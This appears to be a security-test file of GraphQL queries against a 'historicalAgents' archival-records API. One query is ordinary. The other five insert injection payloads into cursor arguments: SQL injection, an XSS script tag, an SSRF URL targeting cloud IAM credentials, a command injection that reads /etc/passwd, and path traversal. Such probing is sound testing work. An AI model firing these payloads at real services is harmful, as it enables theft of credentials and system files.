query {
  historicalAgents(first: 5) {
    items {
      id
      type
      identifier
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query {
  historicalAgents(after: "1' OR '1'='1") {
    items {
      id
      identifier
      descriptions {
        name
      }
    }
  }
}

query {
  historicalAgents(from: "<script>alert('xss')</script>") {
    items {
      id
      description {
        name
        biographicalHistory
      }
    }
  }
}

query {
  historicalAgents(after: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    items {
      id
      links {
        id
        description
      }
    }
  }
}

query {
  historicalAgents(from: "; cat /etc/passwd || true") {
    items {
      id
      descriptions {
        name
      }
    }
  }
}

query {
  historicalAgents(after: "../../etc/passwd") {
    items {
      id
      description {
        source
      }
    }
  }
}

